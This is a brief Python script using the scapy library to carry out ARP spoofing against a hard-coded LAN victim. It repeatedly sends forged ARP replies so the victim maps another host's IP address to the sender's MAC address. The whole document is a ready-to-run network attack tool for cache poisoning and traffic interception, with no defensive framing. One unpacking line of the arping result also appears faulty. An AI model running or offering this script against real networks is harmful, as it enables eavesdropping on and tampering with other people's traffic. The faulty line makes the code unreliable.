from scapy.all import ARP, Ether, sendp, arping
import time

def get_mac(ip):
    ans,  = arping(ip, timeout=2, verbose=False)
    for s, r in ans:
        return r[Ether].src
    return None

def arp_spoof(target_ip, spoof_ip, iface=None):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not get MAC for {target_ip}")
        return

    print(f"[+] Target MAC for {target_ip} is {target_mac}")
    print(f"[*] Starting ARP spoof: Telling {target_ip} that {spoof_ip} is-at <your-mac>\n")

    packet = Ether(dst=target_mac) / ARP(
        op=2,
        psrc=spoof_ip,
        pdst=target_ip,
        hwdst=target_mac
    )

    try:
        while True:
            sendp(packet, iface=iface, verbose=0)  # NOTE: using sendp here!
            print(f"[+] Sent ARP reply to {target_ip}: {spoof_ip} is-at <your-mac>")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Spoofing stopped.")

if __name__ == "__main__":
    victim_ip = "192.168.8.105"
    spoof_ip = "192.168.8.107"  # The IP you’re pretending to be
    iface = "Ethernet"          # Replace with your actual interface name

    arp_spoof(victim_ip, spoof_ip, iface=iface)